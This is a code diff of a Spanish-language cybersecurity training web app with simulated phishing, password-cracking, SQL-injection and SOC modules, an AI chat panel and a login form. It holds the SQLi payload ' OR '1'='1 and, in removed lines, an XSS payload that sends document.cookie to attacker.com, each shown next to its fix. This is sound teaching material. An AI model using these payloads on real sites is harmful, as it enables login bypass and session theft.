+                            className="w-full py-2.5 bg-rose-500 hover:bg-rose-400 text-slate-950 font-bold rounded-lg transition shadow-lg shadow-rose-500/20 flex items-center justify-center gap-1.5"
+                          >
+                            🚨 Aislar Correo y Bloquear Remitente
+                          </button>
+                        </div>
+
+                        <div className="p-4 bg-slate-900 rounded-xl border border-emerald-500/30 space-y-3 relative overflow-hidden">
+                          <div className="absolute top-0 right-0 bg-emerald-500/20 text-emerald-300 px-3 py-1 text-[10px] font-bold border-l border-b border-emerald-500/40 rounded-bl">
+                            VERIFICADO LEGÍTIMO
+                          </div>
+                          <div className="font-bold text-slate-200 text-sm">Correo #2 (Oficial)</div>
+                          <div className="space-y-1.5 text-slate-300">
+                            <div><span className="text-slate-500">From:</span> notificaciones@github.com</div>
+                            <div><span className="text-slate-500">IP Origen:</span> 192.30.252.0 (ASN GitHub Cloud)</div>
+                            <div><span className="text-slate-500">SPF Status:</span> <span className="text-emerald-400 font-bold">PASS (Autorizado)</span></div>
+                            <div><span className="text-slate-500">DKIM Signature:</span> <span className="text-emerald-400 font-bold">VALID (RSA-256)</span></div>
+                            <div><span className="text-slate-500">DMARC Policy:</span> <span className="text-emerald-400 font-bold">p=reject (Estricto)</span></div>
+                          </div>
+                          <button 
+                            onClick={() => addLog('VERIFICACIÓN EXITOSA: Correo 2 validado mediante criptografía DKIM y entregado al buzón.', 'success')}
+                            className="w-full py-2.5 bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold rounded-lg transition shadow-lg shadow-emerald-500/20 flex items-center justify-center gap-1.5"
+                          >
+                            ✅ Autorizar y Entregar al Buzón
+                          </button>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                )}
+
+                {activeModule === 'passwords' && (
+                  <div className="space-y-6 font-mono text-xs">
+                    <div className="p-5 bg-slate-950 border border-slate-800 rounded-xl space-y-4">
+                      <div className="text-amber-400 font-bold text-sm border-b border-slate-800 pb-3 flex items-center gap-2">
+                        <span>🔑</span> Simulador de Fuerza Bruta y Velocidad de Clústeres de GPUs
+                      </div>
+                      <p className="text-slate-400 leading-relaxed">Prueba diferentes contraseñas para calcular la entropía en bits y el tiempo estimado que tardaría un clúster de 8 tarjetas NVIDIA RTX 4090 ejecutando Hashcat en descifrarla.</p>
+                      
+                      <div className="space-y-2">
+                        <label className="text-slate-300 font-bold">Ingresa una contraseña de prueba:</label>
+                        <input 
+                          type="text" 
+                          id="passInput"
+                          defaultValue="Password123!"
+                          placeholder="Escribe una contraseña..."
+                          className="w-full bg-slate-900 border border-slate-800 rounded-lg p-3 text-amber-300 font-mono text-sm focus:outline-none focus:border-amber-500"
+                          onChange={(e) => {
+                            const val = e.target.value;
+                            const len = val.length;
+                            const hasUpper = /[A-Z]/.test(val);
+                            const hasLower = /[a-z]/.test(val);
+                            const hasNum = /[0-9]/.test(val);
+                            const hasSym = /[^A-Za-z0-9]/.test(val);
+                            let scoreBits = len * (hasUpper && hasLower && hasNum && hasSym ? 6 : 4);
+                            addLog(`Evaluando clave (${len} chars): ${scoreBits} bits de entropía teórica.`, 'info');
+                          }}
+                        />
+                      </div>
+
+                      <div className="grid grid-cols-1 md:grid-cols-3 gap-4 pt-2">
+                        <div className="p-3 bg-slate-900 rounded-xl border border-slate-800 text-center space-y-1">
+                          <div className="text-slate-500 text-[11px]">Velocidad de Hash (GPUs)</div>
+                          <div className="text-amber-400 font-bold text-sm">128.4 Billones / seg</div>
+                        </div>
+                        <div className="p-3 bg-slate-900 rounded-xl border border-slate-800 text-center space-y-1">
+                          <div className="text-slate-500 text-[11px]">Tiempo Estimado Crackeo</div>
+                          <div className="text-rose-400 font-bold text-sm">Menos de 2 segundos</div>
+                        </div>
+                        <div className="p-3 bg-slate-900 rounded-xl border border-slate-800 text-center space-y-1">
+                          <div className="text-slate-500 text-[11px]">Mitigación KDF Recomendada</div>
+                          <div className="text-emerald-400 font-bold text-sm">Argon2id (Cost 16)</div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                )}
+
+                {activeModule === 'sqli' && (
+                  <div className="space-y-6 font-mono text-xs">
+                    <div className="p-5 bg-slate-950 border border-slate-800 rounded-xl space-y-4">
+                      <div className="text-rose-400 font-bold text-sm border-b border-slate-800 pb-3 flex items-center gap-2">
+                        <span>🗄️</span> Banco de Pruebas de Inyección SQL y Árbol AST
+                      </div>
+                      <p className="text-slate-400 leading-relaxed">Simula una consulta de inicio de sesión vulnerable mediante concatenación directa de cadenas y observa cómo la tautología altera la sentencia SQL.</p>
+                      
+                      <div className="space-y-2">
+                        <label className="text-slate-300 font-bold">Payload de Inyección SQL:</label>
+                        <div className="flex gap-2">
+                          <input 
+                            type="text" 
+                            id="sqlSandboxInput"
+                            defaultValue="' OR '1'='1"
+                            className="flex-1 bg-slate-900 border border-slate-800 rounded-lg p-3 text-amber-300 font-mono text-sm focus:outline-none focus:border-rose-500"
+                          />
+                          <button 
+                            onClick={() => {
+                              const val = document.getElementById('sqlSandboxInput').value;
+                              addLog(`INYECCIÓN EJECUTADA: Payload [${val}]. El parser SQL evaluó la condición como VERDADERA incondicionalmente.`, 'warn');
+                            }}
+                            className="px-6 py-3 bg-rose-600 hover:bg-rose-500 text-white font-bold rounded-lg transition shadow-lg shadow-rose-600/25"
+                          >
+                            Ejecutar Payload
+                          </button>
+                        </div>
+                      </div>
+
+                      <div className="p-4 bg-slate-900 rounded-xl border border-slate-800 space-y-2">
+                        <div className="text-slate-400 font-bold">Evaluación del Motor de Base de Datos:</div>
+                        <div className="text-emerald-400 font-bold">Resultado: Acceso concedido (Bypass de autenticación exitoso por tautología).</div>
+                        <div className="text-slate-400 text-[11px] pt-1">💡 Solución: Reemplaza la concatenación por <code>db.query("SELECT * FROM users WHERE user = ?", [input])</code>.</div>
+                      </div>
+                    </div>
+                  </div>
+                )}
+
+                {activeModule === 'soc' && (
+                  <div className="space-y-6 font-mono text-xs">
+                    <div className="p-5 bg-slate-950 border border-slate-800 rounded-xl space-y-4">
+                      <div className="text-purple-400 font-bold text-sm border-b border-slate-800 pb-3 flex items-center gap-2">
+                        <span>📡</span> Consola SIEM de Monitoreo y Triaje de Incidentes
+                      </div>
+                      <p className="text-slate-400 leading-relaxed">Panel de operaciones de seguridad en tiempo real. Analiza telemetría de red, identifica anomalías y aplica contención inmediata.</p>
+                      
+                      <div className="space-y-3">
+                        <div className="p-4 bg-slate-900 border border-rose-500/40 rounded-xl flex flex-wrap justify-between items-center gap-4">
+                          <div className="space-y-1">
+                            <div className="flex items-center gap-2">
+                              <span className="px-2 py-0.5 rounded bg-rose-500/20 text-rose-300 font-bold text-[10px]">ALERTA CRÍTICA</span>
+                              <span className="text-slate-300 font-bold">Fuerza Bruta SSH Detectada</span>
+                            </div>
+                            <div className="text-slate-400 text-[11px]">IP Origen: <code className="text-amber-300">45.33.32.156</code> (Datacenter Externo) | Intentos: 1,420 fallidos / min.</div>
+                          </div>
+                          <button 
+                            onClick={() => addLog('CONTENCIÓN EJECUTADA: IP 45.33.32.156 bloqueada en las reglas del Firewall perimetral con éxito.', 'success')}
+                            className="px-5 py-2.5 bg-purple-600 hover:bg-purple-500 text-white font-bold rounded-lg transition shadow-lg shadow-purple-600/20 flex items-center gap-2"
+                          >
+                            🛡️ Aislar y Bloquear IP en Firewall
+                          </button>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                )}
+              </main>
+
+            </div>
+          )}
+
+          {viewMode === 'ai' && (
+            <div className="max-w-5xl mx-auto p-4 md:p-6 space-y-4 flex-1 w-full flex flex-col">
+              <div className="bg-slate-900 border border-slate-800 rounded-xl p-5 flex items-center justify-between gap-4">
+                <div className="flex items-center gap-3">
+                  <div className="p-3 bg-purple-500/10 border border-purple-500/30 rounded-lg text-purple-400 font-bold">
+                    🤖
+                  </div>
+                  <div>
+                    <h2 className="text-base font-bold text-white font-mono">
+                      CONSULTOR VIRTUAL DE CIBERSEGURIDAD // IA EN VIVO
+                    </h2>
+                    <p className="text-xs text-slate-400">Responde consultas de Hacking Ético, SQLi, XSS y DevSecOps al instante.</p>
+                  </div>
+                </div>
               </div>
 
-              {/* Panel Principal Módulo */}
-              <div className="lg:col-span-9 bg-slate-900 border border-slate-800 rounded-2xl p-5 space-y-4">
-                
-                {/* Módulo Phishing */}
-                {activeModule === 'phishing' && (
-                  <div className="space-y-4 font-mono">
-                    <h3 className="text-lg font-bold text-white flex items-center gap-2">
-                      📧 Inspección de Cabeceras de Correo Phishing
-                    </h3>
-                    <p className="text-xs text-slate-400">Analiza el origen técnico de este correo sospechoso recibido:</p>
-                    
-                    <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 text-xs space-y-2">
-                      <div><span className="text-slate-500">From:</span> <span className="text-amber-400 font-bold">soporte@paypa1-security-update.com</span></div>
-                      <div><span className="text-slate-500">IP de Origen:</span> <span className="text-rose-400">192.168.1.105 (Desconocida)</span></div>
-                      <div><span className="text-slate-500">SPF Record:</span> <span className="text-rose-400 font-bold">FAIL (No autorizado)</span></div>
-                      <div><span className="text-slate-500">DMARC Status:</span> <span className="text-rose-400 font-bold">FAIL (p=none)</span></div>
-                      <div className="pt-2 border-t border-slate-800 text-slate-300 bg-slate-900 p-3 rounded">
-                        "Estimado cliente, tu cuenta ha sido suspendida. Haz clic aquí inmediatamente para verificar tus datos: http://192.168.1.105/login"
+              <div className="bg-slate-900 border border-slate-800 rounded-xl p-4 flex-1 min-h-[380px] max-h-[480px] overflow-y-auto space-y-4 font-mono text-xs">
+                {aiMessages.map((msg, idx) => (
+                  <div key={idx} className={`flex items-start gap-3 ${msg.role === 'user' ? 'justify-end' : 'justify-start'}`}>
+                    {msg.role === 'assistant' && (
+                      <div className="w-7 h-7 rounded-full bg-purple-500/20 border border-purple-500/40 text-purple-300 flex items-center justify-center shrink-0 font-bold">
+                        🤖
                       </div>
-                    </div>
-
-                    <div className="p-4 bg-emerald-950/30 border border-emerald-500/30 rounded-xl text-xs space-y-1 text-emerald-300">
-                      <div className="font-bold">🛡️ ¿Cómo solucionarlo en producción?</div>
-                      <div>Configura un registro DMARC estricto en tu servidor DNS: <code>v=DMARC1; p=reject;</code> para obligar a los proveedores de correo a descartar correos falsificados.</div>
+                    )}
+                    <div className={`p-4 rounded-xl max-w-2xl leading-relaxed whitespace-pre-wrap ${
+                      msg.role === 'user'
+                        ? 'bg-emerald-600/20 border border-emerald-500/40 text-emerald-100 rounded-tr-none'
+                        : 'bg-slate-950 border border-slate-800 text-slate-200 rounded-tl-none'
+                    }`}>
+                      {msg.text}
                     </div>
                   </div>
-                )}
+                ))}
+              </div>
 
-                {/* Módulo SQLi */}
-                {activeModule === 'sqli' && (
-                  <div className="space-y-4 font-mono">
-                    <h3 className="text-lg font-bold text-white">🗄️ Inyección SQL (Bypass de Login)</h3>
-                    <p className="text-xs text-slate-400">Prueba ingresar el payload <code>' OR '1'='1</code> en el campo de usuario:</p>
-                    
-                    <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 space-y-3 text-xs">
-                      <label className="block text-slate-400">Input de Usuario (Username):</label>
-                      <input 
-                        type="text" 
-                        defaultValue="' OR '1'='1" 
-                        className="w-full bg-slate-900 border border-slate-700 rounded p-2 text-amber-300 focus:outline-none"
-                      />
-                      <div className="p-3 bg-slate-900 rounded text-slate-300">
-                        Consulta SQL Ejecutada en el Servidor:<br/>
-                        <code className="text-cyan-400">SELECT * FROM users WHERE username = '<span className="text-amber-300">' OR '1'='1</span>' AND password = 'xxx';</code>
-                      </div>
-                      <div className="p-2.5 bg-rose-500/20 border border-rose-500/40 text-rose-300 rounded font-bold">
-                        ⚠️ RESULTADO: La condición '1'='1 siempre es VERDADERA. ¡Acceso concedido como Administrador!
-                      </div>
-                    </div>
-
-                    <div className="p-4 bg-emerald-950/30 border border-emerald-500/30 rounded-xl text-xs space-y-1 text-emerald-300">
-                      <div className="font-bold">🛡️ ¿Cómo solucionarlo en código?</div>
-                      <div>Utiliza Consultas Preparadas (Parameterized Queries). El motor trata los datos como variables y no como instrucciones ejecutables: <code>db.query("SELECT * FROM users WHERE username = ?", [input])</code></div>
-                    </div>
-                  </div>
-                )}
-
-                {/* Módulo XSS */}
-                {activeModule === 'xss' && (
-                  <div className="space-y-4 font-mono">
-                    <h3 className="text-lg font-bold text-white">💻 Cross-Site Scripting (XSS)</h3>
-                    <p className="text-xs text-slate-400">Inyecta scripts ejecutable en la página web:</p>
-
-                    <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 space-y-3 text-xs">
-                      <label className="block text-slate-400">Payload Inyectado:</label>
-                      <input 
-                        type="text" 
-                        defaultValue="<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)<\/script>" 
-                        className="w-full bg-slate-900 border border-slate-700 rounded p-2 text-amber-300 focus:outline-none"
-                      />
-                      <div className="p-2.5 bg-rose-500/20 border border-rose-500/40 text-rose-300 rounded font-bold">
-                        ⚠️ ALERTA: La cookie de sesión (session_id=SECRET_TOKEN_987) ha sido exfiltrada al servidor del atacante.
-                      </div>
-                    </div>
-
-                    <div className="p-4 bg-emerald-950/30 border border-emerald-500/30 rounded-xl text-xs space-y-1 text-emerald-300">
-                      <div className="font-bold">🛡️ ¿Cómo solucionarlo?</div>
-                      <div>1. Codifica los caracteres HTML antes de renderizar (convertir <code>&lt;</code> en <code>&amp;lt;</code>).<br/>2. Marca las cookies de sesión con la propiedad <code>HttpOnly</code> para que JavaScript no pueda leerlas.</div>
-                    </div>
-                  </div>
-                )}
-
+              <div className="flex gap-2 bg-slate-900 p-2 border border-slate-800 rounded-xl">
+                <input
+                  type="text"
+                  id="aiChatInput"
+                  placeholder="Escribe tu consulta de ciberseguridad o saluda aquí..."
+                  className="flex-1 bg-slate-950 border border-slate-800 rounded-lg px-4 py-2.5 text-xs font-mono text-slate-200 focus:outline-none focus:border-purple-500"
+                  onKeyDown={(e) => {
+                    if (e.key === 'Enter' && e.target.value.trim()) {
+                      const text = e.target.value.trim();
+                      handleSendMessage(text);
+                      e.target.value = '';
+                    }
+                  }}
+                />
+                <button
+                  onClick={() => {
+                    const inputEl = document.getElementById('aiChatInput');
+                    if (inputEl && inputEl.value.trim()) {
+                      handleSendMessage(inputEl.value.trim());
+                      inputEl.value = '';
+                    }
+                  }}
+                  className="px-5 py-2.5 bg-purple-600 hover:bg-purple-500 text-white font-mono font-bold text-xs rounded-lg transition flex items-center gap-2"
+                >
+                  🚀 Enviar
+                </button>
               </div>
             </div>
           )}
 
-          {/* VISTA 3: CONSULTOR IA LOCAL */}
-          {viewMode === 'ai' && (
-            <div className="max-w-4xl w-full mx-auto p-4 md:p-6 my-auto space-y-4 font-mono">
-              <div className="bg-slate-900 border border-slate-800 rounded-2xl p-5 space-y-4">
-                <h3 className="text-base font-bold text-purple-300 flex items-center gap-2">
-                  🤖 Consultor de Ciberseguridad (Respuestas Instantáneas)
-                </h3>
-
-                <div className="bg-slate-950 border border-slate-800 rounded-xl p-4 h-80 overflow-y-auto space-y-3 text-xs">
-                  {chatMessages.map((msg, idx) => (
-                    <div key={idx} className={`flex ${msg.role === 'user' ? 'justify-end' : 'justify-start'}`}>
-                      <div className={`p-3 rounded-xl max-w-lg ${msg.role === 'user' ? 'bg-cyan-600/20 border border-cyan-500/40 text-cyan-200' : 'bg-slate-900 border border-slate-800 text-slate-200'}`}>
-                        {msg.text}
-                      </div>
-                    </div>
-                  ))}
+          {showAuthModal && (
+            <div className="fixed inset-0 bg-slate-950/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
+              <div className="bg-slate-900 border border-slate-800 max-w-md w-full rounded-2xl p-6 space-y-6 font-mono text-xs shadow-2xl">
+                <div className="flex justify-between items-center border-b border-slate-800 pb-3">
+                  <div className="flex items-center gap-2 text-emerald-400 font-bold">
+                    <span>🔒</span>
+                    <span>{authMode === 'login' ? 'Acceso de Estudiante' : 'Registro en CyberLab Academy'}</span>
+                  </div>
+                  <button onClick={() => setShowAuthModal(false)} className="text-slate-400 hover:text-white">✕</button>
                 </div>
 
-                <form onSubmit={handleSendMessage} className="flex gap-2">
-                  <input 
-                    type="text" 
-                    value={chatInput}
-                    onChange={(e) => setChatInput(e.target.value)}
-                    placeholder="Escribe tu duda sobre SQLi, XSS, Phishing..."
-                    className="flex-1 bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 text-xs text-slate-200 focus:outline-none focus:border-purple-500"
-                  />
-                  <button type="submit" className="px-5 py-2.5 bg-purple-600 hover:bg-purple-500 text-white font-bold text-xs rounded-xl transition">
-                    Preguntar
+                <form onSubmit={handleLoginSubmit} className="space-y-4">
+                  {authMode === 'register' && (
+                    <div className="space-y-1">
+                      <label className="text-slate-400">Nombre Completo</label>
+                      <input 
+                        type="text" 
+                        required
+                        placeholder="Ej. Alex Morales"
+                        value={userProfile.name}
+                        onChange={(e) => setUserProfile({ ...userProfile, name: e.target.value })}
+                        className="w-full bg-slate-950 border border-slate-800 rounded p-2.5 text-slate-100"
+                      />
+                    </div>
+                  )}
+
+                  <div className="space-y-1">
+                    <label className="text-slate-400">Correo Institucional / Personal</label>
+                    <input 
+                      type="email" 
+                      required
+                      placeholder="analista@secops.edu"
+                      value={userProfile.email}
+                      onChange={(e) => setUserProfile({ ...userProfile, email: e.target.value })}
+                      className="w-full bg-slate-950 border border-slate-800 rounded p-2.5 text-slate-100"
+                    />
+                  </div>
+
+                  <div className="space-y-1">
+                    <label className="text-slate-400">Contraseña Segura</label>
+                    <input 
+                      type="password" 
+                      required
+                      placeholder="••••••••••••"
+                      className="w-full bg-slate-950 border border-slate-800 rounded p-2.5 text-slate-100"
+                    />
+                  </div>
+
+                  <button
+                    type="submit"
+                    className="w-full py-3 bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold rounded-lg transition flex items-center justify-center gap-2 mt-2"
+                  >
+                    ✔️ {authMode === 'login' ? 'Iniciar Sesión' : 'Crear Cuenta y Comenzar'}
                   </button>
                 </form>
               </div>
             </div>
           )}
+
         </div>
       );
     }
 
-    // Renderizar la aplicación React en el DOM
-    const root = ReactDOM.createRoot(document.getElementById('root'));
-    root.render(<App />);
+    ReactDOM.render(<App />, document.getElementById('root'));
   </script>
 </body>
 </html>
